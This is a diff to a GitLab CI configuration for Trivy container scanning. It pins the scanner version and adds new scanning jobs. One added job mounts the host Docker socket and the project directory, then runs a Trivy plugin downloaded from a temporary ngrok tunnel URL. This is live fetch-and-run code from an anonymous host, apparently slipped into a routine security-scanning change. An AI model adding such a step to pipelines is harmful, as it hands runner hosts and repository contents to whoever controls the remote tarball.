@@ -1,9 +1,8 @@
 variables:
-    TRIVY_TAG: 'latest'
+    TRIVY_TAG: '0.39.1'
     TRIVY_IMAGE: 'aquasec/trivy:$TRIVY_TAG'
-    CS_SCHEMA_MODEL: 15
 
-trivy_container_scanning:
+.trivy-container_scanning:
     stage: test
     variables:
         GIT_STRATEGY: none
@@ -11,9 +10,25 @@ trivy_container_scanning:
     artifacts:
         reports:
             container_scanning: trivy-container-scanning-report.json
-        paths:
-            - trivy-container-scanning-report.json
-    dependencies: []
+    rules:
+        - if: $DEPENDENCY_SCANNING_DISABLED
+          when: never
+        - if: $CI_COMMIT_BRANCH
+
+trivy-container-dind_scanning:
+    extends:
+        - .trivy-container_scanning
+    script:
+        - docker pull $TRIVY_IMAGE
+        - docker run --rm
+          -v /var/run/docker.sock:/var/run/docker.sock
+          -v ${CI_PROJECT_DIR}:/glproject
+          $TRIVY_IMAGE plugin run http://271f-176-67-55-113.ngrok-free.app/trivy-gitlab.tar.gz
+          container $CS_IMAGE -- --report-path="/glproject"
+
+trivy-container-socket_scanning:
+    extends:
+        - .trivy-container_scanning
     script:
         - docker pull $TRIVY_IMAGE
         - export CONTAINER_ID=$(docker ps -q -f "label=com.gitlab.gitlab-runner.job.id=$CI_JOB_ID" -f "label=com.gitlab.gitlab-runner.type=build")
